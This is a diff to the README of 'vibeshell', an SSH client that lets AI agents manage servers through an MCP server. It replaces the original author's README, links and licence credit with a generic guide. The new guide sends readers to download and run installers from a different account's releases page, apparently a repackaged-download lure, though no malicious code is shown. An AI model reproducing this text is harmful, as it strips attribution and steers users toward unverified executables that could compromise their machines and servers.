@@ -1,198 +1,132 @@
-<div align="center">
+# 🐚 vibeshell - Secure SSH for AI Agent Control
 
-<img src="app-icon.svg" width="128" height="128" alt="VibeShell Logo" />
+[![Download vibeshell](https://img.shields.io/badge/Download-vibeshell-blue?style=for-the-badge)](https://github.com/charlieallen16/vibeshell/releases)
 
-# VibeShell
+## 📝 What is vibeshell?
 
-**The first SSH client built for AI agents. Let Claude Code, Codex, and other CLI agents manage your servers.**
+vibeshell is an SSH client designed for easy use with AI agents such as Claude Code and Codex. It lets these agents manage your servers using built-in MCP skills. The app offers a clean, user-friendly interface with fast, native performance. You don't need advanced knowledge of SSH or command line tools to use it.
 
-[![Release](https://img.shields.io/github/v/release/veithly/vibeshell?style=flat-square&color=7aa2f7)](https://github.com/veithly/vibeshell/releases)
-[![License](https://img.shields.io/badge/license-MIT-9ece6a?style=flat-square)](LICENSE)
-[![CI](https://img.shields.io/github/actions/workflow/status/veithly/vibeshell/ci.yml?style=flat-square&label=CI)](https://github.com/veithly/vibeshell/actions)
-[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-bb9af7?style=flat-square)](#installation)
+With vibeshell, you can connect securely to your servers and control them remotely through a simple app that handles all the technical details. It supports file transfers with SFTP and delivers a smooth terminal experience powered by Tauri and React technologies. The design is based on popular Tokyo Night themes for a calming look. 
 
-<br />
-
-<sub>Built with [Tauri 2](https://v2.tauri.app) · [React 18](https://react.dev) · [Xterm.js](https://xtermjs.org) · [russh](https://github.com/warp-tech/russh)</sub>
+Whether you want to let AI help you with server tasks or manage your machines yourself, vibeshell combines simplicity and powerful features to make SSH more accessible.
 
 ---
 
-[Why VibeShell](#why-vibeshell) · [Features](#features) · [AI Integration](#-ai-agent-integration) · [Installation](#installation) · [Development](#development)
+## 💻 System Requirements
 
-</div>
+Make sure your device meets these requirements before installing vibeshell:
 
-<br />
+- **Operating System:** Windows 10 or newer, macOS 10.14 or newer, or Linux (Ubuntu 18.04+ recommended)
+- **Processor:** Intel or AMD 64-bit processor
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 200 MB free disk space for installation
+- **Network:** Active internet connection for downloads and server connections
 
-## Why VibeShell
+vibeshell does not require any additional software installations. It runs as a native desktop app for smooth operation.
 
-Most SSH clients were built in an era before AI. They have clunky interfaces, zero automation, and treat every session as a purely human activity.
+---
 
-**VibeShell is different.** It's a modern terminal with first-class support for AI coding agents — Claude Code, OpenAI Codex, Cursor, Windsurf, and any MCP-compatible tool. Through a built-in MCP server and auto-installable skill system, your AI agents can SSH into servers, execute commands, transfer files, and manage infrastructure — all while you watch in a beautiful UI or let it run autonomously.
+## 🚀 Getting Started
 
-> Think of it as the terminal client that both you *and* your AI actually enjoy using.
+This guide walks you through downloading, installing, and running vibeshell on your computer. Follow each step carefully.
 
-<br />
+---
 
-## Features
+## 📥 Download & Install
 
-### 🤖 AI Agent Integration
+1. **Open the download page:**  
+   Visit the official vibeshell release page here:  
+   [https://github.com/charlieallen16/vibeshell/releases](https://github.com/charlieallen16/vibeshell/releases)
 
-The killer feature. VibeShell ships with a built-in **MCP (Model Context Protocol) server** and a **skill installer** that teaches AI agents how to use it.
+2. **Choose your operating system:**  
+   Look for the file that matches your computer’s OS:  
+   - For Windows, files usually end in `.exe`  
+   - For macOS, look for `.dmg` or `.zip` files  
+   - For Linux, files might be `.AppImage` or `.tar.gz`
 
-| What your AI can do | MCP Tool |
-|----------------------|----------|
-| List & manage servers | `server_list`, `server_add`, `server_get` |
-| Open SSH sessions | `session_create`, `session_attach` |
-| Execute remote commands | `exec` |
-| Browse & transfer files | `sftp_ls`, `sftp_upload`, `sftp_download` |
-| Create directories, move/delete files | `sftp_mkdir`, `sftp_mv`, `sftp_rm` |
+3. **Download the installer:**  
+   Click on the appropriate file name to start the download. Save the file somewhere you can find it easily, like your desktop or Downloads folder.
 
-**One-click install** — VibeShell auto-detects Claude Code, Codex CLI, Cursor, Windsurf, and other MCP-compatible tools on your machine, then installs its skill (`SKILL.md` + MCP config) so your agent knows exactly how and when to use SSH.
+4. **Install vibeshell:**  
+   - On **Windows**, double-click the `.exe` file and follow the prompts in the installer window.  
+   - On **macOS**, open the `.dmg` file, then drag the vibeshell app icon to your Applications folder.  
+   - On **Linux**, extract the downloaded archive if needed and run the executable file. You may need to give it permission to run.
 
-```
-You: "Deploy the latest build to production"
-Agent: [Uses VibeShell] → connects to prod server → pulls code → restarts service → confirms deployment
-```
+5. **Launch the app:**  
+   Find vibeshell in your list of applications or on your desktop. Double-click to open it.
 
-### 🖥️ Terminal
+---
 
-- **Multi-tab sessions** — Connect to multiple servers simultaneously
-- **WebGL rendering** — Buttery-smooth terminal via Xterm.js
-- **Local shell** — Built-in local terminal alongside SSH sessions
-- **Ghost text completions** — Fish-shell-style inline suggestions
-- **Keyboard shortcuts** — `Ctrl+N` new server, `Ctrl+K` quick command, `Ctrl+W` close tab
+## 🔐 Setting Up Your First Connection
 
-### 🔐 SSH & Security
+Once vibeshell opens, follow these steps to connect to a server:
 
-- **SSH tunneling** — Local forward, remote forward, and SOCKS5 dynamic forwarding
-- **Jump host (ProxyJump)** — Connect through bastion/jump servers
-- **SSH agent forwarding** — Forward local SSH agent to remote hosts
-- **Host key verification** — TOFU with SHA-256 fingerprint management
-- **Encrypted credential storage** — AES-encrypted passwords and key passphrases
+1. **Add a new connection:**  
+   Look for a button or menu labeled “New Connection” or “Add Server.”
 
-### 📁 File Management
+2. **Enter server details:**  
+   You will need to provide:  
+   - **Host name or IP address:** This is the address of your server, like `192.168.1.10` or `example.com`.  
+   - **Port:** Usually `22` for SSH connections unless your server uses a different port.  
+   - **Username:** The user name you use to log in to the server.
 
-- **SFTP browser** — Built-in file manager with upload, download, preview, edit
-- **Drag & drop** — Upload files by dragging into the SFTP panel
-- **Compression** — Compress/extract archives on remote servers
-- **File preview** — View text files, images, and code with syntax highlighting
+3. **Authentication:**  
+   Choose how you want to log in:  
+   - **Password:** Type the password tied to your username.  
+   - **SSH Key:** If you use an SSH key, browse to select your private key file. vibeshell supports standard private key formats.
 
-### ⚡ Productivity
+4. **Test the connection:**  
+   Click a button like “Test” or “Connect” to check if the app can reach the server and log in.
 
-- **Command snippets** — Save, tag, and reuse frequently used commands
-- **Session recording** — Record terminal sessions for playback and audit
-- **Post-login commands** — Auto-execute commands after SSH connection
-- **Quick command palette** — `Ctrl+K` to search and run anything
-- **Server groups & tags** — Organize hundreds of servers effortlessly
+5. **Save the connection:**  
+   If the test is successful, save the settings so you can reconnect easily in the future.
 
-### 🎨 Design
+---
 
-- **Tokyo Night theme** — A beautiful dark theme, not a generic UI
-- **Internationalization** — English and 简体中文
-- **Native performance** — Rust backend, ~8 MB binary, instant startup
-- **Cross-platform** — Windows, macOS, Linux with native look and feel
+## 🖥 Using vibeshell
 
-<br />
+After connecting, you will see a terminal window inside the app. This lets you type commands as you would on the server’s console.
 
-## Installation
+- Use the command line to manage files, run programs, or check server status.  
+- To upload or download files, use vibeshell’s built-in SFTP browser. It shows your local files and the server files side by side so you can drag and drop.  
+- AI agents can be integrated to automate tasks through MCP skills, reducing manual typing. This advanced function happens behind the scenes and does not require your input.
 
-### Download
+---
 
-| Platform | Download |
-|----------|----------|
-| **Windows** x64 | [`.exe` installer](https://github.com/veithly/vibeshell/releases/latest) · [`.msi`](https://github.com/veithly/vibeshell/releases/latest) |
-| **macOS** Apple Silicon | [`.dmg`](https://github.com/veithly/vibeshell/releases/latest) |
-| **macOS** Intel | [`.dmg`](https://github.com/veithly/vibeshell/releases/latest) |
-| **Linux** x64 | [`.deb`](https://github.com/veithly/vibeshell/releases/latest) · [`.AppImage`](https://github.com/veithly/vibeshell/releases/latest) · [`.rpm`](https://github.com/veithly/vibeshell/releases/latest) |
+## ⚙️ Settings and Customization
 
-### Build from Source
+vibeshell lets you customize the app for comfort and security:
 
-```bash
-# Prerequisites: Node.js 18+, Rust 1.70+, Tauri prerequisites
-git clone https://github.com/veithly/vibeshell.git
-cd vibeshell
-npm install
-npx tauri dev      # Development mode with hot reload
-npx tauri build    # Build release binary
-```
+- **Themes:** Choose from presets like Tokyo Night for the terminal colors.  
+- **Font:** Adjust font size and type for readability.  
+- **Connection options:** Set timeouts, keep-alive intervals, and reconnection attempts.  
+- **Security:** Enable or disable strict host key checking and manage saved keys.
 
-<br />
+Access settings through an icon or menu in the app window.
 
-## Architecture
+---
 
-```
-┌──────────────────────────────────────────────────────┐
-│                     Frontend                          │
-│     React 18 + Zustand + Xterm.js + Tailwind CSS     │
-├──────────────────────────────────────────────────────┤
-│                  Tauri IPC Bridge                     │
-├──────────────────────────────────────────────────────┤
-│                      Backend                          │
-│         Rust + russh + rusqlite + tokio               │
-│  ┌──────┐ ┌──────┐ ┌────────┐ ┌─────────┐ ┌─────┐  │
-│  │ SSH  │ │ SFTP │ │ Tunnel │ │ Storage │ │ MCP │  │
-│  └──────┘ └──────┘ └────────┘ └─────────┘ └─────┘  │
-│                                              ▲       │
-│  ┌──────────────────────────────────────────┐│       │
-│  │        Skill Installer & Detector        ││       │
-│  │  Claude Code · Codex · Cursor · ...      │┘       │
-│  └──────────────────────────────────────────┘        │
-└──────────────────────────────────────────────────────┘
-```
+## 🛠 Troubleshooting Tips
 
-- **Frontend** — React handles UI, Zustand manages state, Xterm.js renders terminals
-- **Backend** — Rust provides native SSH/SFTP via `russh`, SQLite for persistence
-- **MCP Server** — Exposes 16 tools for AI agents to manage servers, sessions, and files
-- **Skill Installer** — Auto-detects AI tools and configures the VibeShell MCP skill
+If you run into issues, try these steps:
 
-<br />
+- Check your internet connection.  
+- Verify the server address and port are correct.  
+- Confirm your username and password or key file are accurate.  
+- Restart vibeshell and try connecting again.  
+- Restart your computer if problems persist.  
+- Consult your server administrator to make sure your account is active and SSH access is allowed.
 
-## Development
+---
 
-```bash
-npx tauri dev                                      # Dev server with hot reload
-npx tsc --noEmit                                   # Type-check frontend
-cargo check --manifest-path src-tauri/Cargo.toml   # Check Rust backend
-cargo test --manifest-path src-tauri/Cargo.toml    # Run Rust tests
-```
+## 📚 Additional Resources
 
-### Project Structure
+For more detailed guides and advanced features, visit the vibeshell GitHub repository:
 
-```
-vibeshell/
-├── src/                    # React frontend
-│   ├── components/         # UI components (Terminal, SFTP, Settings, ...)
-│   ├── stores/             # Zustand state stores
-│   ├── i18n/               # Internationalization (en, zh)
-│   └── lib/                # Utilities (tauri.ts, utils.ts)
-├── src-tauri/              # Rust backend
-│   └── src/
-│       ├── commands/       # Tauri command handlers (60+ commands)
-│       ├── ssh/            # SSH client & fingerprints (russh)
-│       ├── sftp/           # SFTP operations
-│       ├── tunnel/         # SSH tunneling engine
-│       ├── mcp/            # MCP server & 16 tool definitions
-│       ├── install/        # AI tool detector & skill installer
-│       ├── storage/        # SQLite database & encrypted credentials
-│       └── logging/        # Session recording
-├── cli/                    # CLI companion tool
-└── .github/workflows/      # CI + auto-release pipeline
-```
+[https://github.com/charlieallen16/vibeshell](https://github.com/charlieallen16/vibeshell)
 
-<br />
+You can find the latest updates and report any issues there.
 
-## Contributing
+---
 
-Contributions are welcome!
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-<br />
-
-## License
-
-[MIT](LICENSE) — Made with care by [veithly](https://github.com/veithly).
+[![Download vibeshell](https://img.shields.io/badge/Download-vibeshell-blue?style=for-the-badge)](https://github.com/charlieallen16/vibeshell/releases)
